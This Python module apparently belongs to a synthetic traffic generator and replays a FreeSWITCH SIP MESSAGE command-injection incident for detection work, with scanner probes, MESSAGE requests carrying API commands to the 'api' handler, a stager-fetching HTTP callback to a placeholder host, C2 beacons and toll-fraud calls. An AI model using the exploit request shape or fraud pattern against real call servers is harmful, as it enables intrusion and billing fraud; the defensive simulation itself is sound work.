"""netgen.freeswitch_sip_message -- the "FreeSWITCH SIP MESSAGE command injection (CVE-2026-116779)" replay.

A replay of the unauthenticated FreeSWITCH flaw (fixed in 1.11.3, CISA KEV): the server reads part of an
inbound SIP MESSAGE recipient as a chat-protocol name, and the registered ``api`` handler passes its text
straight to the FreeSWITCH API -- no login, and inbound ACLs do not look at MESSAGE requests.

What a sensor sees (cleartext SIP on UDP 5060, real RFC 3261 framing, inert placeholder commands):
  * internet SIP scanners sweeping the PBX: OPTIONS and REGISTER probes with scanner User-Agents, mostly
    answered 401/404;
  * the exploit shape: a SIP MESSAGE whose request-URI user is the ``api`` handler and whose
    ``text/plain`` body is a short API command (``status``, ``sofia status``); the server answers 200 OK;
  * the foothold behaving like a hijacked call server: a first-seen DNS lookup and HTTP callback to the
    operator, then toll-fraud call control -- outbound INVITE bursts to a premium-rate SIP gateway with a
    few seconds of G.711 media each -- unlike the PBX's normal internal registrations and calls.

Registered as ``ir-freeswitch-sip-message-cve116779`` (category IR), a SIBLING of the other IR replays.

PIN-SAFE: hosts are injected inside ``build()``; a build that does not select this scenario is
byte-for-byte the baseline.
"""
import os

from netgen import flows as F
from netgen import protocols as P
from netgen.identity import H
from netgen import packkit as K

from netgen.netscaler import phases as NSP

rng = NSP.rng

_FS_SUFFIX, _FS_IP, _FS_MAC = "FSW1", "10.10.20.126", "00:50:56:bb:12:6e"
_EXTERNAL = {
    "attacker": ("node126.probe-pool.example", "203.0.113.126", 12),    # MESSAGE sender + scanner
    "scanA": ("sip-scan-a.probe-pool.example", "203.0.113.127", 14),
    "scanB": ("sip-scan-b.probe-pool.example", "203.0.113.128", 9),
    "callback": ("cdn.voip-telemetry.example", "192.0.2.126", 13),      # HTTP callback + beacon sink
    "trunk": ("gw.premium-route.example", "192.0.2.127", 11),           # toll-fraud SIP gateway
}
_SERVER = "FreeSWITCH-mod_sofia/1.10.12-release+git~20240201"


def _inject_hosts(ctx):
    fs = K.add_internal(ctx, _FS_SUFFIX, _FS_IP, _FS_MAC, "Linux (FreeSWITCH 1.10.12)", "sip", "voice")
    return K.add_externals(ctx, "_fsw_ext", _EXTERNAL, rng), fs


def _hdr(src_ip, branch, frm, to, callid, cseq, extra=None):
    return ["Via: SIP/2.0/UDP %s:5060;branch=z9hG4bK%s;rport" % (src_ip, branch), "Max-Forwards: 70", frm, to,
            "Call-ID: " + callid, "CSeq: " + cseq] + (extra or [])


def scan_probe(ctx, scanner, fs, kind, ts=None):
    """An internet SIP scanner sweep: OPTIONS (answered 200/404) or REGISTER (answered 401)."""
    ua = rng.choice(("friendly-scanner", "sipcli/v1.8", "pplsip", "SIPVicious"))
    ext = str(rng.randint(100, 999))
    callid = os.urandom(8).hex()
    frm = "From: \"%s\" <sip:%s@%s>;tag=%s" % (ext, ext, fs.ip, os.urandom(4).hex())
    to = "To: <sip:%s@%s>" % (ext, fs.ip)
    cseq = "1 %s" % kind
    h = _hdr(scanner.ip, os.urandom(6).hex(), frm, to, callid, cseq,
             ["Contact: <sip:%s@%s:5060>" % (ext, scanner.ip), "User-Agent: " + ua, "Accept: application/sdp"])
    out = [ctx.udp(scanner, fs, 5060, 5060, P.sip_msg("%s sip:%s@%s SIP/2.0" % (kind, ext, fs.ip), h), ts, vantage=fs)]
    if kind == "REGISTER":
        status, extra = "401 Unauthorized", ['WWW-Authenticate: Digest realm="%s", nonce="%s", algorithm=MD5' % (fs.ip, os.urandom(8).hex())]
    else:
        status, extra = rng.choice((("200 OK", ["Allow: INVITE, ACK, BYE, CANCEL, OPTIONS, MESSAGE, INFO, UPDATE, REGISTER, REFER, NOTIFY"]),
                                    ("404 Not Found", [])))
    rh = _hdr(scanner.ip, os.urandom(6).hex(), frm, to + ";tag=" + os.urandom(4).hex(), callid, cseq,
              ["Server: " + _SERVER] + extra)
    rh[0] = h[0] + ";received=" + scanner.ip
    out.append(ctx.udp(fs, scanner, 5060, 5060, P.sip_msg("SIP/2.0 " + status, rh), ts + rng.uniform(0.002, 0.012), vantage=fs))
    return F.merged(out)


def message_api(ctx, atk, fs, command, ts=None):
    """The exploit shape: SIP MESSAGE to the ``api`` handler with a short text/plain command body, and
    the server's 200 OK. The command is an inert status query."""
    callid = os.urandom(8).hex()
    frm = "From: <sip:user@%s>;tag=%s" % (atk.ip, os.urandom(4).hex())
    to = "To: <sip:api@%s>" % fs.ip
    body = command.encode()
    h = _hdr(atk.ip, os.urandom(6).hex(), frm, to, callid, "1 MESSAGE",
             ["Contact: <sip:user@%s:5060>" % atk.ip, "User-Agent: sipcli/v1.8", "Content-Type: text/plain",
              "Content-Length: %d" % len(body)])
    req = ("MESSAGE sip:api@%s SIP/2.0\r\n" % fs.ip + "\r\n".join(h) + "\r\n\r\n").encode() + body
    out = [ctx.udp(atk, fs, 5060, 5060, req, ts, vantage=fs)]
    rh = _hdr(atk.ip, os.urandom(6).hex(), frm, to + ";tag=" + os.urandom(4).hex(), callid, "1 MESSAGE",
              ["Server: " + _SERVER])
    rh[0] = h[0] + ";received=" + atk.ip
    out.append(ctx.udp(fs, atk, 5060, 5060, P.sip_msg("SIP/2.0 200 OK", rh), ts + rng.uniform(0.01, 0.06), vantage=fs))
    return F.merged(out)


def http_callback(ctx, fs, cb, ts=None):
    """The foothold's first-contact HTTP fetch of the operator's stager/config (DNS then GET)."""
    dc = ctx.h.get(H("DC1"))
    pre = F.dns_lookup(ctx, fs, cb.fqdn, ts, external=True, answers=[(P.DNS_A, cb.ipb)], dc=dc) if dc else []
    t = ts + 0.06
    out = ctx.arp_for(fs, cb, t, vantage=fs)
    s = ctx.tcp(fs, cb, 80, t + 0.001, vantage=fs).handshake()
    s.c2s(("GET /s/%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: curl/7.88.1\r\nAccept: */*\r\n\r\n"
           % (os.urandom(4).hex(), cb.fqdn)).encode(), think=0.01)
    s.s2c(P.http_response("200 OK", os.urandom(rng.randint(180, 420)), "application/octet-stream", s.t, server="nginx"),
          think=rng.uniform(0.03, 0.12))
    return F.merged(pre, out, s.close(by_client=True, think=rng.uniform(0.02, 0.1)))


def toll_fraud_call(ctx, fs, trunk, number, seconds, ts=None):
    """An outbound INVITE to the premium-rate gateway the foothold now controls: INVITE -> 100 -> 200 ->
    ACK, a few seconds of G.711 media, BYE. Wholly unlike the PBX's internal call pattern."""
    out = ctx.arp_for(fs, trunk, ts, vantage=fs)
    callid = os.urandom(8).hex() + "@" + fs.ip
    frm = "From: <sip:+15550100@%s>;tag=%s" % (fs.ip, os.urandom(4).hex())
    to = "To: <sip:%s@%s>" % (number, trunk.ip)
    mp, rp = rng.randrange(16384, 32766, 2), rng.randrange(16384, 32766, 2)
    h = _hdr(fs.ip, os.urandom(6).hex(), frm, to, callid, "1 INVITE",
             ["Contact: <sip:+15550100@%s:5060>" % fs.ip, "User-Agent: " + _SERVER, "Allow: INVITE, ACK, BYE, CANCEL, OPTIONS"])
    out.append(ctx.udp(fs, trunk, 5060, 5060, P.sip_msg("INVITE sip:%s@%s SIP/2.0" % (number, trunk.ip), h, P.sdp(fs.ip, mp, rng.randint(1000, 99999))), ts, vantage=fs))
    toh = to + ";tag=" + os.urandom(4).hex()
    out.append(ctx.udp(trunk, fs, 5060, 5060, P.sip_msg("SIP/2.0 100 Trying", _hdr(fs.ip, "x", frm, toh, callid, "1 INVITE")), ts + 0.03, vantage=fs))
    out.append(ctx.udp(trunk, fs, 5060, 5060, P.sip_msg("SIP/2.0 200 OK", _hdr(fs.ip, "x", frm, toh, callid, "1 INVITE", ["Contact: <sip:%s@%s:5060>" % (number, trunk.ip)]),
                                                         P.sdp(trunk.ip, rp, rng.randint(1000, 99999))), ts + rng.uniform(1.5, 4.0), vantage=fs))
    t0 = ts + 3.2
    out.append(ctx.udp(fs, trunk, 5060, 5060, P.sip_msg("ACK sip:%s@%s:5060 SIP/2.0" % (number, trunk.ip), _hdr(fs.ip, os.urandom(6).hex(), frm, toh, callid, "1 ACK")), t0, vantage=fs))
    ssa, ssb = rng.getrandbits(32), rng.getrandbits(32)
    sa, sb, rta, rtb = rng.randint(0, 40000), rng.randint(0, 40000), rng.getrandbits(32), rng.getrandbits(32)
    for i in range(int(seconds / 0.02)):
        tt = t0 + 0.04 + i * 0.02
        out.append(ctx.udp(fs, trunk, mp, rp, P.rtp_packet(sa + i, rta + i * 160, ssa, marker=(i == 0)), tt, vantage=fs, tos=0xB8))
        out.append(ctx.udp(trunk, fs, rp, mp, P.rtp_packet(sb + i, rtb + i * 160, ssb, marker=(i == 0)), tt + 0.01, vantage=fs, tos=0xB8))
    te = t0 + 0.06 + seconds
    out.append(ctx.udp(fs, trunk, 5060, 5060, P.sip_msg("BYE sip:%s@%s:5060 SIP/2.0" % (number, trunk.ip), _hdr(fs.ip, os.urandom(6).hex(), frm, toh, callid, "2 BYE")), te, vantage=fs))
    out.append(ctx.udp(trunk, fs, 5060, 5060, P.sip_msg("SIP/2.0 200 OK", _hdr(fs.ip, "x", frm, toh, callid, "2 BYE")), te + 0.02, vantage=fs))
    return F.merged(out)


def phone_register(ctx, phone, fs, ts=None):
    """Benign look-alike: an internal phone registers to the call server (401 challenge, then 200)."""
    ext = 2000 + int(phone.name[-2:])
    out = ctx.arp_for(phone, fs, ts, vantage=fs)
    callid = os.urandom(8).hex() + "@" + phone.ip
    nonce = os.urandom(8).hex()
    frm, to = "From: <sip:%d@%s>;tag=%s" % (ext, fs.ip, os.urandom(4).hex()), "To: <sip:%d@%s>" % (ext, fs.ip)
    ct = "Contact: <sip:%d@%s:5060;transport=udp>" % (ext, phone.ip)
    base = ["Expires: 3600", "User-Agent: Cisco-CP8841/14.2.1", ct]
    out.append(ctx.udp(phone, fs, 5060, 5060, P.sip_msg("REGISTER sip:%s SIP/2.0" % fs.ip, _hdr(phone.ip, os.urandom(6).hex(), frm, to, callid, "1 REGISTER", base)), ts, vantage=fs))
    out.append(ctx.udp(fs, phone, 5060, 5060, P.sip_msg("SIP/2.0 401 Unauthorized", _hdr(phone.ip, "x", frm, to + ";tag=fs" + os.urandom(3).hex(), callid, "1 REGISTER",
               ['WWW-Authenticate: Digest realm="%s", nonce="%s", algorithm=MD5' % (fs.ip, nonce), "Server: " + _SERVER])), ts + 0.004, vantage=fs))
    auth = 'Authorization: Digest username="%d", realm="%s", nonce="%s", uri="sip:%s", response="%s", algorithm=MD5' % (ext, fs.ip, nonce, fs.ip, os.urandom(16).hex())
    out.append(ctx.udp(phone, fs, 5060, 5060, P.sip_msg("REGISTER sip:%s SIP/2.0" % fs.ip, _hdr(phone.ip, os.urandom(6).hex(), frm, to, callid, "2 REGISTER", base + [auth])), ts + 0.03, vantage=fs))
    out.append(ctx.udp(fs, phone, 5060, 5060, P.sip_msg("SIP/2.0 200 OK", _hdr(phone.ip, "x", frm, to + ";tag=fs" + os.urandom(3).hex(), callid, "2 REGISTER", [ct + ";expires=3600", "Date: " + P.http_date(ts)])), ts + 0.04, vantage=fs))
    return F.merged(out)


def build(ctx, eng, tag, win):
    """Schedule the CVE-2026-116779 incident: scanner sweeps, MESSAGE-to-api probes (status queries, then
    a configuration query), the foothold's HTTP callback and C2 beacon, then toll-fraud calls to the
    premium gateway -- with internal phone registrations running alongside as the normal pattern."""
    ext, fs = _inject_hosts(ctx)
    from netgen import incidents as INC
    s = INC.sched_factory(eng, ctx, tag, win)
    lo, hi = win
    scale = max(0.01, min(1.0, getattr(ctx, "scale", 1.0)))
    atk, scA, scB, cb, trunk = ext["attacker"], ext["scanA"], ext["scanB"], ext["callback"], ext["trunk"]

    # ---- internet scanning of the SIP port (background noise from two scanners + the operator) ----
    for sc in (scA, scB, atk):
        t = lo + rng.uniform(0, 120)
        for _ in range(max(6, int(round(30 * scale)) + 6)):
            s(t, scan_probe, sc, fs, rng.choice(("OPTIONS", "OPTIONS", "REGISTER")))
            t += rng.uniform(5, 40)

    # ---- the MESSAGE-to-api exploit shape ----
    for off, cmd in ((420, "status"), (433, "sofia status"), (470, "show channels"), (520, "global_getvar domain")):
        s(lo + off, message_api, atk, fs, cmd)

    # ---- foothold behaviour: callback, beacon, toll-fraud call control ----
    s(lo + 600, http_callback, fs, cb)
    t, counter = lo + 700, 1
    while t < hi:
        s(t, NSP.c2_beacon, fs, cb, counter)
        counter += 1
        t += rng.uniform(55, 95)
    numbers = ("+2528123456", "+88216091234", "+2398765432", "+8801912345678")
    t = lo + 900
    for _ in range(max(4, int(round(14 * scale)) + 4)):
        s(t, toll_fraud_call, fs, trunk, rng.choice(numbers), rng.uniform(3.0, 6.0))
        t += rng.uniform(25, 70)

    # ---- benign look-alike: internal phone registrations on the same call server ----
    phones = sorted((h for h in ctx.h.values() if h.name.startswith(H("PH"))), key=lambda h: h.name)
    for p in phones[:max(4, int(round(12 * scale)) + 4)]:
        s(lo + rng.uniform(0, max(1.0, hi - lo - 30)), phone_register, p, fs)
